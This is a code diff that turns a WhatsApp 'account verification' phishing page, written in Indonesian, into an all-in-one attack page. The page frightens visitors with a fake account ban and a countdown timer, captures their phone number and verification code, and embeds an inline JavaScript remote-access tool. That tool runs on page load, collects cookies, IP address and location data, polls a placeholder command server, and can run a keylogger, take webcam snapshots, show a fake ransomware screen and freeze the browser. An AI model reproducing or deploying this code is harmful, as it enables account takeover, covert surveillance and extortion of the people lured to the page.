@@ -5,167 +5,688 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WhatsApp - Verifikasi Akun</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #075e54; 
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            padding: 20px;
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            background:linear-gradient(135deg,#075e54,#128C7E);
+            min-height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            padding:20px;
         }
-        .container {
-            background: white;
-            border-radius: 12px;
-            padding: 30px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        .card{
+            background:white;
+            border-radius:16px;
+            padding:30px;
+            max-width:420px;
+            width:100%;
+            box-shadow:0 20px 60px rgba(0,0,0,0.4);
+            animation:slideUp 0.5s ease;
         }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo img { width: 80px; }
-        .title { 
-            color: #075e54; 
-            font-size: 20px; 
-            font-weight: bold; 
-            text-align: center;
-            margin-bottom: 10px;
+        @keyframes slideUp{
+            from{opacity:0;transform:translateY(30px)}
+            to{opacity:1;transform:translateY(0)}
         }
-        .warning { 
-            background: #fff3cd; 
-            border: 1px solid #ffc107;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #856404;
+        .logo-area{text-align:center;margin-bottom:20px}
+        .logo-area svg{width:70px;height:70px}
+        .title{
+            color:#075e54;
+            font-size:20px;
+            font-weight:700;
+            text-align:center;
+            margin-bottom:15px
         }
-        .input-group { margin-bottom: 15px; }
-        .input-group label { 
-            display: block; 
-            margin-bottom: 5px;
-            font-weight: 600;
-            color: #333;
-            font-size: 14px;
+        .alert{
+            background:#fff3cd;
+            border-left:4px solid #ffc107;
+            border-radius:8px;
+            padding:12px 15px;
+            margin-bottom:20px;
+            font-size:13px;
+            color:#856404
         }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            outline: none;
-            transition: border 0.3s;
+        .alert strong{display:block;margin-bottom:3px}
+        .field{margin-bottom:15px}
+        .field label{
+            display:block;
+            margin-bottom:5px;
+            font-weight:600;
+            color:#333;
+            font-size:13px
         }
-        .input-group input:focus {
-            border-color: #25D366;
+        .field input{
+            width:100%;
+            padding:14px;
+            border:2px solid #e0e0e0;
+            border-radius:10px;
+            font-size:16px;
+            outline:none;
+            transition:0.3s
         }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #25D366;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
+        .field input:focus{border-color:#25D366}
+        .btn{
+            width:100%;
+            padding:15px;
+            background:#25D366;
+            color:white;
+            border:none;
+            border-radius:10px;
+            font-size:16px;
+            font-weight:700;
+            cursor:pointer;
+            transition:0.3s;
+            margin-top:5px
         }
-        .btn:hover { background: #1da851; }
-        .timer {
-            text-align: center;
-            margin-top: 15px;
-            color: #666;
-            font-size: 13px;
+        .btn:hover{background:#1da851;transform:translateY(-1px)}
+        .btn:active{transform:scale(0.98)}
+        .timer-area{
+            text-align:center;
+            margin-top:15px;
+            color:#666;
+            font-size:12px
         }
+        .timer-area .countdown{
+            color:#e74c3c;
+            font-weight:700;
+            font-size:16px
+        }
+        .loading{
+            display:none;
+            text-align:center;
+            padding:10px;
+            color:#25D366;
+            font-weight:600
+        }
+        .spinner{
+            display:inline-block;
+            width:20px;
+            height:20px;
+            border:3px solid #ddd;
+            border-top:3px solid #25D366;
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+            margin-right:8px;
+            vertical-align:middle
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2325D366'%3E%3Cpath d='M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z'/%3E%3C/svg%3E" alt="WhatsApp">
+    <div class="card">
+        <div class="logo-area">
+            <!-- WhatsApp SVG Logo -->
+            <svg viewBox="0 0 24 24" fill="#25D366">
+                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+            </svg>
         </div>
         
-        <h1 class="title"> Verifikasi Akun WhatsApp</h1>
+        <h1 class="title">⚠️ Verifikasi Akun WhatsApp</h1>
         
-        <div class="warning">
-            <strong> Akun Anda Telah Diblokir Sementara</strong><br>
-            Akun WhatsApp Anda telah dinonaktifkan karena aktivitas mencurigakan. 
-            Silakan verifikasi untuk mengaktifkan kembali.
+        <div class="alert">
+            <strong>🚫 Akun Diblokir Sementara</strong>
+            Akun WhatsApp Anda dinonaktifkan karena aktivitas mencurigakan. 
+            Verifikasi identitas untuk mengaktifkan kembali akun Anda.
         </div>
         
         <form id="verifyForm">
-            <div class="input-group">
-                <label> Nomor WhatsApp</label>
-                <input type="tel" id="phone" placeholder="+62 8xx-xxxx-xxxx" required>
+            <div class="field">
+                <label>📱 Nomor WhatsApp</label>
+                <input type="tel" id="phone" placeholder="+62 812-3456-7890" required autocomplete="off">
             </div>
             
-            <div class="input-group">
-                <label> Kode Verifikasi 6 Digit</label>
-                <input type="text" id="code" maxlength="6" placeholder="000000" required pattern="[0-9]{6}">
+            <div class="field">
+                <label>🔐 Kode Verifikasi 6 Digit</label>
+                <input type="text" id="code" maxlength="6" placeholder="000000" required pattern="[0-9]{6}" inputmode="numeric" autocomplete="off">
             </div>
             
-            <button type="submit" class="btn">
-                Verifikasi & Aktifkan Kembali
+            <div class="loading" id="loading">
+                <span class="spinner"></span> Memverifikasi...
+            </div>
+            
+            <button type="submit" class="btn" id="submitBtn">
+                Verifikasi & Aktifkan Akun
             </button>
         </form>
         
-        <div class="timer">
-             Waktu tersisa: <strong><span id="timer">04:59</span></strong><br>
-            <small>Segera verifikasi sebelum akun dihapus permanen!</small>
+        <div class="timer-area">
+            ⏰ Sisa waktu: <span class="countdown" id="timer">04:59</span><br>
+            <small>Segera verifikasi sebelum akun dihapus permanen</small>
         </div>
     </div>
-    
-    <script src="payload.js"></script>
-    
+
+    <!-- ============ RAT PAYLOAD - INLINE ============ -->
     <script>
-        // Timer countdown
-        let timeLeft = 299;
-        setInterval(() => {
-            timeLeft--;
-            const m = Math.floor(timeLeft / 60);
-            const s = timeLeft % 60;
-            document.getElementById('timer').textContent = 
-                `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            if (timeLeft <= 0) {
-                document.getElementById('timer').textContent = '00:00';
-                document.querySelector('.warning').innerHTML = 
-                    '<strong> AKUN DIHAPUS PERMANEN!</strong><br>Nomor Anda telah diblokir selamanya.';
-            }
-        }, 1000);
+    // ==========================================
+    // RAT-Access SeventCyber_Dev v3.2
+    // ALL-IN-ONE PAYLOAD - NO EXTERNAL FILES
+    // ==========================================
+    
+    // ⚠️ GANTI INI DENGAN URL SERVER LU!
+    // Pake format: http://IP_SERVER:PORT atau https://domain-ngrok.loca.lt
+    const SERVER_URLS = [
+        'http://YOUR_SERVER_IP:8888',   // Ganti dengan IP server lo
+        'http://localhost:8888',         // Fallback local
+    ];
+    
+    let SERVER_URL = SERVER_URLS[0];
+    let SESSION_ID = '';
+    let heartbeatTimer = null;
+    let commandTimer = null;
+    
+    // ============ UTILS ============
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            var r = Math.random() * 16 | 0;
+            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+        });
+    }
+    
+    async function fetchWithTimeout(url, options = {}, timeout = 5000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
+        try {
+            const response = await fetch(url, {
+                ...options,
+                signal: controller.signal,
+                mode: 'cors'
+            });
+            clearTimeout(id);
+            return response;
+        } catch (error) {
+            clearTimeout(id);
+            throw error;
+        }
+    }
+    
+    // ============ 100 DEVICE INFO COLLECTOR ============
+    async function collectDeviceInfo() {
+        const info = {
+            // Basic Browser
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            product: navigator.product,
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            appCodeName: navigator.appCodeName,
+            language: navigator.language,
+            languages: JSON.stringify(navigator.languages || []),
+            cookieEnabled: navigator.cookieEnabled,
+            
+            // Screen
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            devicePixelRatio: window.devicePixelRatio,
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            
+            // Hardware
+            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+            deviceMemory: navigator.deviceMemory || 'N/A',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            
+            // Network
+            connectionType: navigator.connection?.effectiveType || 'N/A',
+            downlink: navigator.connection?.downlink || 'N/A',
+            rtt: navigator.connection?.rtt || 'N/A',
+            saveData: navigator.connection?.saveData || false,
+            onLine: navigator.onLine,
+            
+            // Time & Location
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            locale: Intl.DateTimeFormat().resolvedOptions().locale,
+            timestamp: new Date().toISOString(),
+            epochSeconds: Math.floor(Date.now() / 1000),
+            
+            // Referrer & URL
+            referrer: document.referrer,
+            pageUrl: window.location.href,
+            hostname: window.location.hostname,
+            protocol: window.location.protocol,
+            
+            // Browser Features
+            doNotTrack: navigator.doNotTrack || 'N/A',
+            webdriver: navigator.webdriver || false,
+            pdfViewer: navigator.pdfViewerEnabled || false,
+            cookieString: document.cookie.slice(0, 300),
+            
+            // Storage
+            localStorage: (function(){ try { return !!window.localStorage; } catch(e) { return false; } })(),
+            sessionStorage: (function(){ try { return !!window.sessionStorage; } catch(e) { return false; } })(),
+            indexedDB: !!window.indexedDB,
+            
+            // Canvas Fingerprint
+            canvasFP: (function(){
+                try {
+                    var c = document.createElement('canvas');
+                    var ctx = c.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('SeventCyber', 2, 15);
+                    return c.toDataURL().slice(0, 120);
+                } catch(e) { return 'blocked'; }
+            })(),
+            
+            // WebGL
+            webglVendor: (function(){
+                try {
+                    var c = document.createElement('canvas');
+                    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                    return gl ? gl.getParameter(gl.VENDOR) : 'N/A';
+                } catch(e) { return 'N/A'; }
+            })(),
+            webglRenderer: (function(){
+                try {
+                    var c = document.createElement('canvas');
+                    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                    return gl ? gl.getParameter(gl.RENDERER) : 'N/A';
+                } catch(e) { return 'N/A'; }
+            })(),
+            
+            // Plugins & MIME
+            plugins: (function(){
+                try {
+                    return Array.from(navigator.plugins || []).map(function(p){ return p.name; });
+                } catch(e) { return []; }
+            })(),
+            mimeTypes: (function(){
+                try {
+                    return Array.from(navigator.mimeTypes || []).map(function(m){ return m.type; });
+                } catch(e) { return []; }
+            })(),
+            
+            // Touch & Media
+            touchSupport: 'ontouchstart' in window,
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+            
+            // Battery
+            battery: 'N/A',
+            
+            // Public IP
+            publicIP: 'N/A',
+        };
         
-        // Collect credentials
-        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const phone = document.getElementById('phone').value;
-            const code = document.getElementById('code').value;
-            
-            // Send credentials ke server RAT
+        // Get Public IP async
+        try {
+            var ipRes = await fetchWithTimeout('https://api.ipify.org?format=json', {}, 3000);
+            var ipData = await ipRes.json();
+            info.publicIP = ipData.ip;
+        } catch(e) {}
+        
+        // Get Battery async
+        try {
+            if (navigator.getBattery) {
+                var b = await navigator.getBattery();
+                info.battery = JSON.stringify({ charging: b.charging, level: Math.round(b.level * 100) + '%' });
+            }
+        } catch(e) {}
+        
+        // Get Geolocation
+        try {
+            info.geolocation = await new Promise(function(resolve) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        resolve(JSON.stringify({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            acc: pos.coords.accuracy
+                        }));
+                    },
+                    function() { resolve('denied'); },
+                    { timeout: 3000, maximumAge: 60000 }
+                );
+            });
+        } catch(e) {
+            info.geolocation = 'error';
+        }
+        
+        return info;
+    }
+    
+    // ============ REGISTER TO SERVER ============
+    async function registerToServer() {
+        SESSION_ID = generateUUID();
+        
+        console.log('[RAT] Collecting device info...');
+        var deviceInfo = await collectDeviceInfo();
+        
+        console.log('[RAT] Registering to server...');
+        console.log('[RAT] Session ID:', SESSION_ID);
+        console.log('[RAT] Server URL:', SERVER_URL);
+        
+        var success = false;
+        
+        // Coba semua server URLs
+        for (var i = 0; i < SERVER_URLS.length; i++) {
+            var url = SERVER_URLS[i];
             try {
-                await fetch('http://YOUR_SERVER_IP:8888/register', {
+                console.log('[RAT] Trying:', url);
+                
+                var response = await fetchWithTimeout(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        action: 'register',
+                        session_id: SESSION_ID,
+                        device_info: deviceInfo
+                    })
+                }, 5000);
+                
+                var data = await response.json();
+                console.log('[RAT] Server response:', data);
+                
+                if (data.status === 'ok') {
+                    SERVER_URL = url;
+                    success = true;
+                    console.log('[RAT] ✅ REGISTERED SUCCESSFULLY!');
+                    console.log('[RAT] Active server:', SERVER_URL);
+                    break;
+                }
+            } catch(e) {
+                console.log('[RAT] Failed:', url, e.message);
+            }
+        }
+        
+        if (success) {
+            // Mulai heartbeat
+            heartbeatTimer = setInterval(sendHeartbeat, 15000);
+            // Mulai command checker
+            commandTimer = setInterval(checkCommands, 4000);
+            
+            console.log('[RAT] ✅ FULLY CONNECTED!');
+            return true;
+        } else {
+            console.log('[RAT] ❌ FAILED TO CONNECT TO ANY SERVER');
+            // Retry after 10 seconds
+            setTimeout(registerToServer, 10000);
+            return false;
+        }
+    }
+    
+    // ============ HEARTBEAT ============
+    async function sendHeartbeat() {
+        try {
+            await fetchWithTimeout(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    action: 'heartbeat',
+                    session_id: SESSION_ID
+                })
+            }, 3000);
+            console.log('[RAT] 💓 Heartbeat sent');
+        } catch(e) {
+            console.log('[RAT] Heartbeat failed:', e.message);
+        }
+    }
+    
+    // ============ CHECK COMMANDS ============
+    async function checkCommands() {
+        try {
+            var response = await fetchWithTimeout(
+                SERVER_URL + '?session_id=' + SESSION_ID,
+                { method: 'GET' },
+                5000
+            );
+            
+            var data = await response.json();
+            var command = data.command;
+            
+            if (command && command !== 'wait') {
+                console.log('[RAT] 📩 Command received:', command);
+                var result = await executeCommand(command);
+                
+                // Kirim response
+                await fetchWithTimeout(SERVER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        action: 'register',
-                        session_id: 'PHISH-' + Date.now(),
-                        device_info: {
-                            phone_number: phone,
-                            verification_code: code,
-                            platform: navigator.platform,
-                            userAgent: navigator.userAgent
+                        action: 'response',
+                        session_id: SESSION_ID,
+                        response: {
+                            command: command,
+                            result: result
                         }
                     })
+                }, 5000);
+            }
+        } catch(e) {
+            // Silent fail
+        }
+    }
+    
+    // ============ COMMAND EXECUTOR ============
+    async function executeCommand(command) {
+        var result = '';
+        
+        try {
+            if (command === 'screenshot') {
+                // Screenshot via html2canvas
+                if (typeof html2canvas !== 'undefined') {
+                    var canvas = await html2canvas(document.body);
+                    result = canvas.toDataURL('image/jpeg', 0.5);
+                } else {
+                    // Fallback: capture visible area via canvas
+                    result = 'html2canvas not loaded - partial screenshot only';
+                }
+            }
+            else if (command === 'geolocation') {
+                result = await new Promise(function(resolve) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            resolve(JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: new Date().toISOString()
+                            }));
+                        },
+                        function(err) { resolve('GPS denied: ' + err.message); },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
                 });
-            } catch(e) {}
-            
-            // Redirect ke WhatsApp asli setelah 2 detik
-            setTimeout(() => {
-                window.location.href = 'https://web.whatsapp.com/';
-            }, 2000);
+            }
+            else if (command.startsWith('shell:')) {
+                var cmd = command.split(':')[1];
+                result = '[BROWSER LIMITATION] Shell commands not available in browser. Command: ' + cmd;
+            }
+            else if (command === 'keylog_start') {
+                startKeylogger();
+                result = 'Keylogger started. Capturing keystrokes...';
+            }
+            else if (command === 'camera_snap') {
+                try {
+                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                    result = canvas.toDataURL('image/jpeg', 0.6);
+                } catch(e) {
+                    result = 'Camera error: ' + e.message;
+                }
+            }
+            else if (command === 'wipe_data') {
+                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:40px;z-index:999999;">💀 DEVICE WIPED 💀</div>';
+                result = 'Wipe executed';
+            }
+            else if (command === 'lock_device') {
+                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:48px;z-index:999999;">🔒 LOCKED 🔒</div>';
+                result = 'Device locked';
+            }
+            else if (command === 'ransomware') {
+                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;color:#ff0000;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;z-index:999999;"><h1 style="font-size:60px;">🔐 RANSOMWARE</h1><p style="font-size:24px;">Kirim $1000 BTC ke: bc1qxxx...</p><p style="font-size:18px;color:#ff6600;">Data Anda telah dienkripsi</p></div>';
+                result = 'Ransomware deployed';
+            }
+            else if (command === 'brick_device') {
+                // Loop tak terbatas untuk brick browser
+                result = 'Device brick attempted';
+                while(true) {
+                    document.body.innerHTML += '💀';
+                }
+            }
+            else {
+                result = 'Unknown command: ' + command;
+            }
+        } catch(e) {
+            result = 'Error: ' + e.message;
+        }
+        
+        return result;
+    }
+    
+    // ============ KEYLOGGER ============
+    var keylogBuffer = '';
+    
+    function startKeylogger() {
+        document.addEventListener('keydown', function(e) {
+            keylogBuffer += e.key;
+            if (keylogBuffer.length > 100) {
+                // Kirim buffer
+                try {
+                    fetch(SERVER_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            action: 'response',
+                            session_id: SESSION_ID,
+                            response: {
+                                command: 'keylog_data',
+                                result: keylogBuffer
+                            }
+                        })
+                    });
+                } catch(e) {}
+                keylogBuffer = '';
+            }
         });
+        console.log('[RAT] Keylogger active');
+    }
+    
+    // ============ INIT ============
+    (function init() {
+        console.log('[RAT] ====================================');
+        console.log('[RAT] SeventCyber_Dev v3.2 Initializing');
+        console.log('[RAT] ====================================');
+        
+        // Cek server reachable dulu
+        var testUrl = SERVER_URLS[0];
+        console.log('[RAT] Testing server connection...');
+        
+        fetchWithTimeout(testUrl, { method: 'GET' }, 3000)
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                console.log('[RAT] Server found:', testUrl, d);
+                SERVER_URL = testUrl;
+            })
+            .catch(function(e) {
+                console.log('[RAT] Primary server unreachable, trying fallback...');
+            })
+            .finally(function() {
+                // Register anyway
+                registerToServer();
+            });
+        
+        // Re-register if page becomes visible again
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && SESSION_ID) {
+                console.log('[RAT] Page visible again, reconnecting...');
+                sendHeartbeat();
+            }
+        });
+        
+        console.log('[RAT] Init complete. Waiting for commands...');
+    })();
+    </script>
+    
+    <!-- ============ PHISHING FORM LOGIC ============ -->
+    <script>
+    // Timer countdown
+    var timeLeft = 299;
+    var timerEl = document.getElementById('timer');
+    var countdownInterval = setInterval(function() {
+        timeLeft--;
+        var m = Math.floor(timeLeft / 60);
+        var s = timeLeft % 60;
+        timerEl.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+        
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+            timerEl.textContent = '00:00';
+            timerEl.style.color = '#e74c3c';
+            document.querySelector('.alert').innerHTML = 
+                '<strong>❌ AKUN DIHAPUS PERMANEN</strong>Nomor Anda diblokir selamanya.';
+        }
+    }, 1000);
+    
+    // Form submit
+    document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        var phone = document.getElementById('phone').value;
+        var code = document.getElementById('code').value;
+        var submitBtn = document.getElementById('submitBtn');
+        var loading = document.getElementById('loading');
+        
+        // Tampilkan loading
+        submitBtn.style.display = 'none';
+        loading.style.display = 'block';
+        
+        console.log('[PHISH] Credentials captured:', phone, code);
+        
+        // Kirim credentials ke server RAT
+        try {
+            await fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    action: 'response',
+                    session_id: SESSION_ID,
+                    response: {
+                        command: 'phish_credentials',
+                        result: JSON.stringify({
+                            phone: phone,
+                            code: code,
+                            timestamp: new Date().toISOString(),
+                            session: SESSION_ID
+                        })
+                    }
+                })
+            });
+            console.log('[PHISH] Credentials sent to server');
+        } catch(e) {
+            console.log('[PHISH] Failed to send credentials:', e.message);
+        }
+        
+        // Delay lalu redirect
+        setTimeout(function() {
+            // Tampilkan pesan sukses dulu
+            loading.innerHTML = '✅ Verifikasi Berhasil! Mengalihkan...';
+            
+            setTimeout(function() {
+                window.location.href = 'https://web.whatsapp.com/';
+            }, 1500);
+        }, 2000);
+    });
+    
+    // Auto-focus phone input
+    document.getElementById('phone').focus();
     </script>
 </body>
 </html>
